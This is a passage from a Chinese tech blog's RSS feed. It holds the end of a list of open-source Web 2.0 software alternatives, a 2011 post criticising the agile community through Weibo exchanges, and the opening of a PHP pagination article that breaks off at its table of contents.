<a href="http://lasecwww.epfl.ch/iChair/" rel="nofollow">iChair</a>，会议系统，支持论文提交，评审，讨论等。</li>
<li>
<a href="http://indico-software.org/" rel="nofollow">Indico</a>，会议计划，组织，支持从简单到复杂的会议。</li>
<li>
<a href="https://www.oschina.net/p/icecore" target="_blank">ICEcore</a>，开放团队合作软件使用社交联网统一团队工作空间、实时网络会议、项目管理、实践团体以及远程操作。</li>
</ul>
</ul>
<ul>
<li>
<strong>反馈</strong>（Pollmonkey, Google Forms）</li>
<ul>
<li>
<a href="https://www.limesurvey.org/" rel="nofollow">Limesurvey</a>，前身为PHPSurveyor）是一款在线问卷调查程序，它用PHP语言编写并可以使用MySQL，PostgreSQL或者MSSQL等多种数据库，它集成了调查程序开发、调查问卷的发布以及数据收集等功能，使用它，用户不必了解这些功能的编程细节。</li>
</ul>
</ul>
<ul>
<li><strong>其它</strong></li>
<ul>
<li>
<a href="http://www.barnraiser.org/aroundme/" target="_blank">AROUNDMe</a>，可以创建像Ning, Myspace, Yahoo or Google groups一样的合作网站。每个群组可以创建多个网页，网页上包括留言簿、博客、论坛、维基百科等功能。每个群组还可以通过xHTML, CSS, JavaScript and PHP来进行自定义。</li>
<li>
<a href="http://interactome.org/" target="_blank">InteractOLE</a>，是一款网络学习的递交和支持平台。与其他在线学习平台不同，InteractOLE致力于教学与学习的社交和互动方面，而不是向学生们学习内容的提供。</li>
</ul>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%BA%AFWeb_20%E6%9C%8D%E5%8A%A1"></span>纯Web 2.0服务<span class="ez-toc-section-end"></span>
</h4>
</div>
<div>
<ul>
<li>
<strong>Feed操作</strong>（Yahoo Pipes）</li>
<ul>
<li>
<a href="http://pipes.deri.org/" rel="nofollow">Deri Pipes</a>，像Yahoo Pipes一样，可视化的在线编程工具，它是一个用于过滤、转换和聚合网页内容的服务。</li>
</ul>
</ul>
<ul>
<li>
<strong>Feed 聚合</strong>（Bloglines, Google Reader）</li>
<ul>
<li>
<a href="https://newsblur.com/" rel="nofollow">Newsblur</a>，像Google Reader一样的一个RSS在线阅读器。</li>
<li>
<a href="http://rsslounge.aditu.de/" rel="nofollow">rsslounge</a>，基于PHP+MySQL开发的RSS供稿阅读器。可以分类，过滤供稿，设置优先权。除标准的供稿项目之外，还支持图片/照片。</li>
<li>
<a href="http://tt-rss.org/redmine/" rel="nofollow">Tiny Tiny RSS</a>，基于Web的RSS/Atom新闻聚合器。它的UI基于Ajax技术开发所以看起非常像一个桌面应用程序。</li>
<li>
<a href="http://getlilina.org/" rel="nofollow">Lilina</a>，一个开源的RSS新闻聚合器实现，功能强大，方便易用，而且最大的好处是不需要数据库支持。</li>
<li>
<a href="http://openwebreader.org/" rel="nofollow">OpenWebReader</a>，多用户的RSS聚合阅读。</li>
<li>
<a href="https://sourceforge.net/projects/gregarius/" rel="nofollow">Gregarius</a>，RSS/RDF/ATOM新闻聚合器支持OPML导入/导出，XHTML/CSS输出。它包含一个基于Ajax的itemtagging系统。</li>
<li>
<a href="http://cheetah-news.com/" rel="nofollow">Cheetah News</a>，利用AJAX技术构建的RSS阅读器，完美支持中文。</li>
<li>
<a href="https://www.oschina.net/p/memephage" target="_blank">Memephage</a>，是一种自动化网络日志。它能搜集并总结从不同地方收集来的连接，目前是从IRC, 社交MUD，邮件和浏览器中搜集，并使用POE多任务处理和网络框架。</li>
<li>
<a href="https://sourceforge.net/projects/ozcode/" target="_blank">Ozcode</a>，是Ozmozr.com背后的源代码, 一个微型RSS聚合器，可以进行网络社交、信息分享、身份聚合与展示的网站。</li>
</ul>
</ul>
<ul>
<li>
<strong>社区聚合</strong>（FriendFeed）</li>
<ul>
<li>
<a href="http://identi.ca/" rel="nofollow">Identi.ca</a>，一个新的微网志服务, 其实现在微博服务真的是很多了, 不过这个比较特别一点的是, identi.ca 用PHP 开发, 可以用jabber/GTalk, 也可以用openid 来登录，主要的是，其是开源项目。</li>
<li>
<a href="http://noserub.com/" rel="nofollow">Noserub</a>，提供的建站程序，可以创建属于你的微型门户，包括 Blog、网络摘录、图片分享、视频、Twitter 等等的，都可以罗列出来，并且通过 RSS 实时更新内容，你的朋友们可以方便的获知你在网络里经常去哪里，最近在关注一些什么，做些什么，想些什么。</li>
</ul>
</ul>
<ul>
<li>
<strong>社区新闻</strong>（digg）</li>
<ul>
<li>
<a href="http://meneame.net/" rel="nofollow">Meneame</a>，程序是类似Digg的西班牙程序，网址是<a href="http://websvn.meneame.net/">http://websvn.meneame.net/</a>
</li>
<li>
<a href="http://pligg.com/" rel="nofollow">Pligg</a>，最灵活的类似Digg的Web2.0 CMS系统！网页设计师可以使用<em>Pligg</em>做他(她)想做的任何事情。稍微懂一些PHP和Mysql的知识即可安装<em>Pligg</em>。</li>
<li>
<a href="https://drupal.org/project/drigg/" rel="nofollow">Drigg</a>，基于Drupal 构建的PHP的Digg网站系统。</li>
<li>
<a href="https://www.reddit.com/" rel="nofollow">Reddit</a>，其源码和文档在这里：<a href="https://github.com/reddit/reddit">https://github.com/reddit/reddit</a>
</li>
<li>
<a href="https://sourceforge.net/projects/communitynews/" target="_blank">CommunityNews</a>，通过使用社交书签和贝叶斯定理技术向博客定期提供记录。用户可以通过投票支持或反对RSS来源以支持那些受欢迎的资源。</li>
<li>
<a href="http://opensource.newscloud.com/" target="_blank">NewsCloud</a>，是一款基于NewsCloud.com专为平民新闻业和社会新闻网络设计的开源传媒平台。</li>
<li>
<a href="http://jamss.sourceforge.net/" target="_blank">Jamss</a>，是基于Digg.com的社交新闻网站, 其通过PHP/MySQL运行。.Jamss 考虑到了行内意见和网络文章的评论，还可以灵活适应多种主题。</li>
</ul>
</ul>
<ul>
<li>
<strong>社区网络</strong>（Facebook, Twitter）</li>
<ul>
<li>
<a href="http://portal.friendika.com/" rel="nofollow">Friendika</a>，一个由PHP+MySQL的免费应用程式(Open Source)，提供使用者一个单一的界面来控制社群网路服务。支援的社群网路应用服务包括Facebook，Twitter、WordPress、Blogger、Identi.ca、RSS订阅与电子邮件等等的整合服务。</li>
<li>
<a href="https://joindiaspora.com/" rel="nofollow">Diaspora</a>，让你将您的关系分成多个视图（Google+的圈子），每个视图是您生活的不同部分。这是Diaspora首创，用来确保您的照片、经历和笑话，只与您所希望分享的人分享。</li>
<li>
<a href="http://buddypress-es.com/" rel="nofollow">Buddypress</a>，是 WordPress 母公司的一个全新的开源程序，BuddyPress 从本质上说其实是 WordPress 的插件。BuddyPress 把 WordPress的关注点从博客转移到了社区。当然，用户还是能够使用WordPress的所有的博客功能，只是当用户使用 BuddyPress 时，第一要做的是创建他们个人档案，第二才是写博客。</li>
<li>
<a href="http://foocorp.org/projects/social/" rel="nofollow">GNU Social</a>，GNU的SNS。</li>
<li>
<a href="http://www.elgg.org/" rel="nofollow">Elgg</a>，一款免费开源的社会性网络脚本程序(php/mysql)，以BLOG为中心实现社会网络化，从社会性来讲：Elgg以兴趣为核心的社交平台。它包括网络日志、资料存储、RSS集合、个人档案、FOAF功能等等。</li>
<li>
<a href="http://www.socialengine.net/index_vivalogo.php" target="_blank">SocialEngine</a>，是一款由PHP和Zend控制的网络软件，其脚本让你可以轻松地创建属于你自己社交网站或是在线社区，包括自定义群组、相册、消息、用户档案、视频、新闻订阅，拖放群集邮箱服务器等等功能。</li>
<li>
<a href="http://www.isocial.in/" target="_blank">iSocial</a>，是一款免费社交网络脚本平台，你可以用它建立像Friendster和Orkut那样可以一键使用书签，约会和建立群组的社交网站。</li>
<li>
<a href="http://mahara.org/" target="_blank">Mahara</a>，有着电子档案、网络日志、简历编辑工具、联系用户的社交网络系统以及建立在线社区的齐全功能。</li>
<li>
<a href="https://sourceforge.net/projects/peepagg/" target="_blank">The PeopleAggregator</a>，是全新一代的社交网站系统，它力求应用开放的标准、密切的网络互动和强大的灵活性。</li>
<li>
<a href="http://opensource.appleseedproject.org/" target="_blank">Appleseed</a>，是一款类似Friendster的社交网站软件。网站运行appleseed将互通，形成Appleseed的社交网站。该软件发展的重点是对隐私和安全，以及易用的配置。</li>
<li>
<a href="http://www.mugshots.com/" target="_blank">Mugshot</a>，则通过一系列的WEB CRM、照片、日志等等让你时刻了解朋友们的最新动态。</li>
<li>
<a href="https://code.google.com/p/clonesumating/" target="_blank">Clonesumating</a>，是<a href="http://consumating.com/" target="_blank">CONSUMATING.COM</a>代码的开源版本， 其功能有用户档案、用户标签、配对并发现古怪标签合并、团队活动（比如每周照片评选、博客问答）、事件日历、PSS订阅等等。</li>
<li>
<a href="http://www.bevolunteer.org/trac/" target="_blank">BeWelcom Rox</a>，是<a href="http://www.bewelcome.org/" target="_blank">www.bewelcome.org</a>等其他社交网站的运作平台，它将人们真实地聚集了在一起。在那里人们了解全球村庄以及其他文化，分享自己的所在地，组织旅游，写旅游博客等等。</li>
<li>
<a href="https://sourceforge.net/projects/openpne/" target="_blank">OpenPNE</a>，是由PHP写成的网络社交服务引擎，其功能有好友管理、好友邀请、日记、博客、订收件箱等等。</li>
<li>
<a href="https://sourceforge.net/projects/worldspace/" target="_blank">WorldSpace</a>，是一款用户可拓展的共享虚拟空间，它致力于成为新一代的社交网络系统。</li>
<li>
<a href="http://zoints.com/" target="_blank">Zoints</a>，这一款软件熟知在线社区是互联网中最重要的一部分，它所正是为帮助解决论坛版主所面临的三大问题（即获得会员，保留会员和盈利）而设计的。</li>
</ul>
</ul>
<ul>
<li>
<strong>社区书签</strong>（Delicious）</li>
<ul>
<li>
<a title="Scuttle" href="https://en.wikipedia.org/wiki/Scuttle">Scuttle</a>，开源Web书签系统，允许多个用户在线存储，共享和Tag他们喜欢的链接。</li>
<li>
<a href="https://sourceforge.net/projects/semanticscuttle/" rel="nofollow">Semantic Scuttle</a>，是一款基于Scuttle的社交书签工具。它可以试验像层次化标签、合作描述、OpenID认证这样的全新功能。</li>
<li>
<a href="https://sourceforge.net/projects/sabrosus/" rel="nofollow">Sabros.us</a>，一个基于互联网的书签系统。它与del.icio.us 是相似，您能在网上处理您的书签, 或者自己建立一个网站。</li>
<li>
<a href="http://www.connotea.org/" rel="nofollow">Connotea</a>，是 NGP(Nature Publishing Group) 旗下的网站，借鉴当前流行的 del.icio.us 等社会书签的创意，专注于科研领域，并可导入桌面文献管理软件的数据，是当前比较流行的一款在线文献管理工具。</li>
<li><a href="https://github.com/alx/pressmark/" rel="nofollow">Pressmark</a></li>
<li>
<a href="http://www.shiftspace.org/" rel="nofollow">Shiftspace</a>，让你的Wordpress成为像 <a href="http://del.icio.us/">del.icio.us</a>, <a href="http://sabros.us/">sabros.us</a>这样的站点。</li>
<li>
<a href="http://wwwhatsnew.com/2006/02/02/magnolia-algo-grande-llega-desde-el-mundo-de-los-bookmarks/" rel="nofollow">Ma.gnolia 2</a>，基于Ruby开发。它的界面比较漂亮，但速度比较慢，另外搜索仅限于tag。</li>
<li>
<a href="https://sourceforge.net/projects/akarru" target="_blank">Akarru</a>，是一款用来建立像<a href="http://www.blogmemes.com/" target="_blank">www.blogmemes.com</a>网站的社交书签引擎。用户可以通过投票系统在首页上张贴链接并推销链接。</li>
<li>
<a href="http://www.shokk.com/blog/articles/category/monkeychow/" target="_blank"> Monkey Chow</a>，是一款带有社交书签、主题文章、来源标签、OPML、文章搜索、编辑来源属性等等众多功能的新闻聚合浏览器。</li>
<li>
<a href="http://feedmelinks.com/" target="_blank">Feed Me Links</a>，可以将你的书签存储在网上以便随时随地使用，输入你最喜爱的网址并和好友们分享，加标签来管理不同链接，还有更多新鲜事物等待你来发现。</li>
</ul>
</ul>
<ul>
<li>
<strong>短网址服务</strong>（TinyURL）</li>
<ul>
<li>
<a href="https://gitorious.org/mencey/tinyull" rel="nofollow">tinyULL</a>，不是tinyURL，别看错了。</li>
</ul>
</ul>
<h4>
<span class="ez-toc-section" id="%E8%BA%AB%E4%BB%BD%E5%92%8C%E5%AE%89%E5%85%A8"></span>身份和安全<span class="ez-toc-section-end"></span>
</h4>
</div>
<div>
<ul>
<li><strong>域名</strong></li>
<ul>
<li>
<a href="http://www.namecoin.us/" rel="nofollow">Namecoin</a>/<a href="http://dot-bit.org/" rel="nofollow">.bit</a>，基于bitcoin技术的分散、开放DNS系统。.bit域名到底靠不靠谱啊，是不是有P2P网络存在，.bit网站就能永远访问？会不会被墙？我们不得而之。</li>
<li><a href="http://www.socialdns.net/" rel="nofollow">Social DNS</a></li>
<li><a href="http://distributeddns.sourceforge.net/" rel="nofollow">Distributed DNS</a></li>
</ul>
</ul>
<ul>
<li><strong>身份凭证</strong></li>
<ul>
<li>
<a href="http://wiki.openid.net/w/page/12995176/Libraries/" rel="nofollow">OpenID</a>，一个去中心化的网上身份认证系统。对于支持OpenID的网站，用户不需要记住像用户名和密码这样的传统验证标记。取而代之的是，他们只需要预先在一个作为OpenID身份提供者（identity provider, IdP）的网站上注册。OpenID是去中心化的，任何网站都可以使用OpenID来作为用户登录的一种方式，任何网站也都可以作为OpenID身份提供者。OpenID既解决了问题而又不需要依赖于中心性的网站来确认数字身份。OpenID正在被越来越多的大网站采用</li>
<li>
<a href="https://oauth.net/code/" rel="nofollow">OAuth</a>，（开放授权）是一个开放标准，允许用户让第三方应用访问该用户在某一网站上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。</li>
</ul>
</ul>
<ul>
<li><strong>加密</strong></li>
<ul>
<li>
<a href="http://www.cacert.org/" rel="nofollow">CACert</a>，想给自己申请一份电子邮件证书或者给自己的<a href="http://blog.mop.name/category/%e8%b6%a3%e7%ab%99" target="_blank">网站</a>、服务器申请一个SSL证书是很不容易的，你每年都得给CA（证书颁发验证组织）缴纳不少的证书申请费。有了CAcert，国外一个<a href="http://blog.mop.name/category/free" target="_blank">免费</a>的数字证书颁发组织，你可以<a href="http://blog.mop.name/category/free" target="_blank">免费</a>注册成为用户，申领个人证书和服务器证书等。证书被各种浏览器、邮件客户端所支持。</li>
</ul>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>翻译</strong>（Google Translator）</li>
<ul>
<li>
<a href="http://www.apertium.org/" rel="nofollow">Apertium</a>，一个机器翻译平台，由西班牙政府和加泰罗尼亚自治政府拨款支持阿利坎特大学开发。</li>
</ul>
</ul>
<ul>
<li>
<strong>桌面</strong>（iGoogle, netbives）</li>
<ul>
<li>
<a href="http://www.eyeos.org/" rel="nofollow">EyeOS</a>，一款web桌面环境, 俗称Web Operating System (Web OS)或者Web Office. eyeOS是一个开源的软件, 用户可以自由下载或者在eyeOS的服务器 eyeOS server 上使用. 基本的系统附带一些办公软件和 PIM 应用, 并且在官方http://eyeos.org可以找到完整的程序代码。其开发哲学是：Taking Your Life Everywhere!</li>
<li>CorneliOS，一款运行在服务器端、基于网络的网络虚拟操作系统，本身通过HTML和（或）XHTML为用户提供各种服务，这也就意味着用户只需要使用普通浏览器即可连接并使用这款操作系统。非常类似 eyeOS。</li>
</ul>
</ul>
<ul>
<li>
<strong>3D库</strong>（Google SketchUp 3D Warehouse, Google O3D API）</li>
<ul>
<li>
<a href="https://wiki.mozilla.org/Canvas:3D" rel="nofollow">Mozilla Canvas 3D</a>，OpenGL 3D Web。</li>
<li>
<a href="http://www.doogal.co.uk/KmlViewer.php/" rel="nofollow">Web KML Viewer</a>。</li>
</ul>
</ul>
<div><strong>参考</strong></div>
<div>
<ul>
<li><a href="https://en.wikipedia.org/wiki/List_of_free_software_for_Web_2.0_services" target="_blank">Wikipedia</a></li>
<li><a href="http://www.dasheyin.com/da_jian_ni_zi_ji_de_she_jiao_wang_luo_kai_yuan_she_jiao_wang_luo_cheng_xu_ji_he.html" target="_blank">搭建你自己的社交网络：开源社交网络程序集合</a></li>
</ul>
</div>
</div>
<p></p>
 ]]></content>
<pubDate>2011-08-11T08:40:12+08:00</pubDate>
<guid>https://coolshell.cn/articles/5132.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 在新浪微博上关于敏捷的一些讨论 ]]></title>
<link>https://coolshell.cn/articles/5143.html</link>
<content><![CDATA[ 
<p>自从我发布了“<a title="为什么Scrum不行？" href="https://coolshell.cn/articles/5044.html">Scrum为什么不行</a>”，并被CSDN推成首页头条后，我在我的新浪微博上就经常被敏粉们@去讨论他们的一些话题。<strong>他们似乎想要从我这里听到一些不同的声音，我很喜欢他们的这种态度，在这里先赞他们一个</strong>。既然，让我来评论他们的东西，我就不客气了，板砖自然是少不了的。 我觉得我在微博上的观点比较散，所以在这里做一个汇总。我在所有批评敏捷的文章里都重复说过我的立场，这里还要再说一遍，因为那群人很敏感——“<strong>我承认敏捷中有一些东西我是认可的，但对敏捷社区的推广和思维方式我持否定态度</strong>”。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%95%8F%E6%8D%B7%E8%AF%8D%E6%B1%87%E8%A1%A8" title="敏捷词汇表">敏捷词汇表</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%95%8F%E6%8D%B7%E5%AE%A3%E8%A8%80" title="敏捷宣言">敏捷宣言</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%8D%9A%E6%96%87%E8%AF%84%E8%AE%BA" title="博文评论">博文评论</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%90%8E%E7%BB%AD" title="后续">后续</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%B3%8A%E5%BC%84%E5%AE%A2%E6%88%B7%EF%BC%9F" title="糊弄客户？">糊弄客户？</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%95%8F%E6%8D%B7%E8%AF%8D%E6%B1%87%E8%A1%A8"></span>敏捷词汇表<span class="ez-toc-section-end"></span>
</h4>
<p>我被<a href="https://weibo.com/adamwu73">@吴穹adam</a>邀请进入了一个<a href="http://q.weibo.com/852378?source=weibohome" target="_blank">敏捷词汇表的微群</a>，这个群就是想明确的定义一下敏捷的各种词汇，比如，他们想把TDD定义成就是UT。呵呵。我对这个群仅保持了30分钟的热度，我在里面发了一个“你们不想讨论技术吗？”的帖子，就再也不想关注了。因为我的观点如下：</p>
<ul>
<li>我不知道干这件事有什么意义。标准化还是洗脑？One World, One Agile?  –<strong> horse shit!</strong>
</li>
<li>你能定义地好吗？定义好了大家都能干好了？ –<strong> 幼稚！</strong>
</li>
<li>理解不同又有什么关系？价值观不同又能怎么样？为什么不能正视并接受世界的不同呢？ –  <strong>固执！</strong>
</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%95%8F%E6%8D%B7%E5%AE%A3%E8%A8%80"></span><strong>敏捷宣言</strong><span class="ez-toc-section-end"></span>
</h4>
<p>我看到很多人又把《敏捷宣言》拿出来说事，就好象他们把敏捷宣言是软件开发的普世的价值观一样。我对此的评论是—— <span id="more-5143"></span></p>
<blockquote><p><a href="https://weibo.com/haoel">@左耳朵耗子</a>：<span style="color: #0000ff;">微博里多了很多《敏捷宣言》的话题，这让我想到了《共产党宣言》， 这两个组织里的某些人很相似，都通过宣言来树立价值观，然后通过传教的方式四处宣讲来影响大众吸收党羽，并要求对其价值观的信仰，还以一种革命者的态度来实践…… 建议程序员还是多研究技术细节，关注技术发展趋势，分析产品和用户需求。</span></p></blockquote>
<h4>
<span class="ez-toc-section" id="%E5%8D%9A%E6%96%87%E8%AF%84%E8%AE%BA"></span>博文评论<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://weibo.com/adamwu73">@吴穹adam</a>发表了一篇《<a href="http://blog.csdn.net/adwu73/article/details/6677908" target="_blank">为什么纯粹的Scrum在中国很难落地（一）</a>》并欢迎我去拍砖。我拍了下面几块砖：</p>
<ul>
<li>看标题还以为要谈什么中国实际的问题，结果只是一些文章的读后感。没有实际价值。</li>
<li>我对为什么在中国难落地的原因提了三条：</li>
<ul>
<li>你们总是想以Scrum为中心来改变实际情况和民众，而不是民众自发的。</li>
<li>世界是不同的，多元的，这告诉我们不要死读书，读死书，更不能教条主义。</li>
<li>世界是不完美的。有很多东西无法改变的，如人性，文化，政治…… 要学会接受并管理他们。</li>
</ul>
<li>我给<a href="https://weibo.com/adamwu73">@吴穹adam</a>的建议——<strong>只有当你开始关注实际情况的时候，你才能真正成为一个实践者</strong>。</li>
</ul>
<p>看到在<a href="https://weibo.com/1880082254/xiWv9AShm" target="_blank">评论中</a>——</p>
<blockquote><p> “<a href="https://weibo.com/n/%E5%BC%A0%E6%9D%83%E5%85%88%E7%94%9F">@张权先生</a>：团队拒绝Coach，与敏捷实践缺乏统一认知有关，书籍、网上资料中，很多信息是不统一的，混乱的局面只能从信息源头抓起，规范术语、规范表述为好”。</p></blockquote>
<p>我观点是：</p>
<ul>
<li>先得对大众洗脑，统一认识？和谐？</li>
<li>一千个人有一千个哈姆雷特，认识不同又有何妨？</li>
</ul>
<p><a href="https://weibo.com/1949520867">@蔡晓东_</a>发了一篇《<a href="https://weibo.com/1949520867/xiZRDCOr1" target="_blank">低层级的敏捷毫无意义，组织级敏捷才是敏捷的核心问题</a>》的长微博，也让我去讨论。我这样回复——“<span style="color: #cc0000;"><strong>为什么你们一定要定义哪种软件开发是敏捷？哪种不是? 为什么一定要敏捷呢？做这个划分的目的是什么？是不是只有这样搞，某些组织某些人才有饭碗呢?</strong></span>”， 我希望敏捷社区的人能正面回答我这个问题。</p>
<p>我的一个前同事回复到：</p>
<blockquote><p><a href="https://weibo.com/n/ilinux">@ilinux</a>:”低层级的敏捷毫无意义，组织级敏捷才是敏捷的核心问题”, 这口号听起来就像是要, 从生产关系上和上层建筑着手，解放全世界无产阶级码农。</p></blockquote>
<p>还有一个朋友回复到（多好的建议）：</p>
<blockquote><p>@<a href="https://weibo.com/yuyijq">横刀天笑</a> 低层次不干好，就别谈组织的了吧。。。说实话，我喜欢持续改善，讨厌重大变革。喜欢基础实践，讨厌空喊口号。</p></blockquote>
<h4>
<span class="ez-toc-section" id="%E5%90%8E%E7%BB%AD"></span>后续<span class="ez-toc-section-end"></span>
</h4>
<p>下面这个微博看来是怒了，敏捷社区，你能告诉我这是为什么吗？</p>
<blockquote><p><a href="https://weibo.com/silentriver">@陈加兴</a>：所谓“观其言，察其行”，别人的话摘录再多，终究是别人说的话，和你一毛钱关系都没有。言必称“敏捷”，把敏捷搞得跟唐诗三百首似的颠过来倒过去地背，却不知软件中“设计”为何物，我实在不知道这样“没有项目经验如何谈敏捷”？没有一点团队管理经验，却处处指导众生管理团队，真是神仙下凡啊。</p></blockquote>
<blockquote><p><a href="https://weibo.com/n/%E9%99%88%E5%8A%A0%E5%85%B4">@陈加兴</a>:回复<a href="https://weibo.com/n/%E5%BE%90%E6%AF%85-Kaveri">@徐毅-Kaveri</a>:对事不对人，这种混子行径我唾弃，不点名，因为可以对号入座的人，多着呢。</p></blockquote>
<p>我也认识很多混子，包括现在或曾在TW里的。</p>
<p>最后，让我再echo一下前面的话—— <strong>这两个组织里的某些人很相似，都通过宣言来树立价值观，然后通过传教的方式四处宣讲来影响大众并吸收党羽，并要求对其价值观的信仰，还以一种革命者的态度来实践…… </strong>（有几个网友在我这个微博中讨论了很多，<a href="https://weibo.com/1401880315/xiFMptHMg" target="_blank">大家可以去看看</a>。） <span style="color: #cc0000;"><strong>看这些所谓的咨询师、实践者、倡导者有没有料，你就直接和他谈技术实现，谈业务需求，谈产品分析，你就知道他有多少水水了</strong></span>。</p>
<p><em><strong>————更新2011年8月13日————</strong></em></p>
<h4>
<span class="ez-toc-section" id="%E7%B3%8A%E5%BC%84%E5%AE%A2%E6%88%B7%EF%BC%9F"></span>糊弄客户？<span class="ez-toc-section-end"></span>
</h4>
<p>在微博上看到InfoQ主编+TW咨询师<a href="https://weibo.com/n/%E5%BC%A0%E5%87%AF%E5%B3%B0">@张凯峰</a>同学的一条微博的回复（<a href="https://weibo.com/1416875735/xjiafswMq" target="_blank">原微博在这里</a>）</p>
<figure id="attachment_5152" aria-describedby="caption-attachment-5152" style="width: 458px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5152" class="wp-caption-text">张凯峰的微博：如果客户连需求都说不出一二来，那就太好糊弄了。</figcaption></figure>
<p>糊弄客户！所以，我可以类推他会说——“<strong>如果你不懂敏捷，那就太好糊弄了</strong>”。这就是TW的咨询师。呵呵。</p>
<p>接下来，另一个自称“Agile导师”@<a href="https://weibo.com/1849127973">张义军SH</a>说，</p>
<blockquote><p><a href="https://weibo.com/1849127973">张义军SH</a> 陈浩这次确实有点断章取义了，应该说张凯峰的说法还是很实在的 //<a href="https://weibo.com/n/%E5%B7%A6%E8%80%B3%E6%9C%B5%E8%80%97%E5%AD%90">@左耳朵耗子</a>：回复<a href="https://weibo.com/n/%E5%BC%A0%E5%87%AF%E5%B3%B0">@张凯峰</a>: 糊弄客户?! 看到了吧，InfoQ总编，TW咨询师，真面目暴露出来了吧。//<a href="https://weibo.com/n/%E5%BC%A0%E5%87%AF%E5%B3%B0">@张凯峰</a>:回复 <a href="https://weibo.com/n/weidagang">@weidagang</a>:如果客户连需求都说不出一二来，那就太好糊弄了。</p></blockquote>
<p>这就很强大啊——我到是想听听这个导师认为的“糊弄”的说法怎么个实在法？于是他回复到：</p>
<blockquote><p><a title="张义军SH" href="https://weibo.com/1849127973">张义军SH </a>：回复<a href="https://weibo.com/n/%E5%B7%A6%E8%80%B3%E6%9C%B5%E8%80%97%E5%AD%90">@左耳朵耗子</a>: 我是在看整个讨论过程。在客户没有想法没有太多思路时，他说客户容易糊弄我觉得确实如此，评级很实在。但他们后面在深入讨论这个问题，我认为您也应该看看，给一些建设性意见。</p></blockquote>
<p>呵呵，用户提不出准确的需求这太正常不过了，但是这不代表用户傻，可以糊弄。另外，尤其是那些创新的项目，哪有什么需求，只有一个大概的方向，谁都不知道该做成什么样，我现在做的就是这样的项目。不做个原型，不前期试探一下用户和市场，谁也不知道。</p>
<p>另外，我想告诉这些人，用户需求提不出来很正常，提偏了也很正常，关键在于我们的需求分析能力。福特汽车公司的创始人说过——“<strong>如果我问用户要什么，他们会告诉我他们要一匹更快的马！</strong>”，<strong>大多数平庸的人都会去饲养“一匹更快的马”，而不是分析需求后了解到用户的需求是——“更快的交通工具”。</strong></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-08-12T08:22:58+08:00</pubDate>
<guid>https://coolshell.cn/articles/5143.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ PHP分页技术的代码和示例 ]]></title>
<link>https://coolshell.cn/articles/5160.html</link>
<content><![CDATA[ 
<p>本文来自：<a href="http://zoomzum.com/php-pagination-scripts/" target="_blank">10 Helpful PHP Pagination Scripts For Web Developers</a></p>
<p>分页是目前在显示大量结果时所采用的最好的方式。有了下面这些代码的帮助，开发人员可以在多个页面中显示大量的数据。在互联网上，分​页是一般用于搜索结果或是浏览全部信息（比如：一个论坛主题）。几乎在每一个Web应用程序都需要划分返回的数据，并按页显示。下面的这个列表给出的代码可以让你的开发很有帮助。<strong>学习这些代码，对于初学者也很有帮助</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#1_%E4%BD%BF%E7%94%A8Ajax%E5%88%86%E9%A1%B5" title="1) 使用Ajax分页">1) 使用Ajax分页</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#2_MySql_%E5%88%86%E9%A1%B5" title="2) MySql 分页">2) MySql 分页</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#3_FacebookTwitter_%E9%A3%8E%E6%A0%BC%E7%9A%84%E5%88%86%E9%A1%B5" title="3) Facebook/Twitter 风格的分页">3) Facebook/Twitter 风格的分页</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#4_Php_MySql_%E5%88%86%E9%A1%B5" title="4) Php &amp; MySql 分页">4) Php &amp; MySql 分页</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#5_%E5%88%86%E9%A1%B5%E9%A3%8E%E6%A0%BC" title="5) 分页风格">5) 分页风格</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#6_PHP_%E5%88%86%E9%A1%B5%E7%B1%BB" title="6) PHP 分页类">6) PHP 分页类</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#7_Easy_Pagination" title="7) Easy Pagination">7) Easy Pagination</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#8_%E5%9F%BA%E6%9C%AC%E5%88%86%E9%A1%B5" title="8 ) 基本分页">8 ) 基本分页</a></li>
